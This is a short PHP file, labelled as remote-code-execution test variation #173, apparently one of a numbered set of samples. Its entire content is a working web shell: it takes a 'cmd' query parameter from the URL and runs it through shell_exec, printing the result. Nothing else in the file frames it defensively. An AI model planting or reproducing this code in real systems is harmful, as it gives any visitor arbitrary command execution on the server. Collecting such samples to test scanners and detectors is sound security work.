<?php
// RCE test variation #173
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>